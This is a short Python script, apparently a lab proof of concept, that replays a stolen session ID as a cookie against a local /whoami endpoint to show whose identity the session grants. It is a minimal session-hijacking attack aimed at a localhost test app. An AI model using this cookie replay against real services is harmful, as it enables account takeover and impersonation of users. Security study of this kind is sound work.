import sys
import requests

stolen_id = sys.argv[1]

r = requests.get(
    "http://127.0.0.1:5000/whoami",
    cookies={"session_id": stolen_id},
    timeout=10,
)
print(r.text)   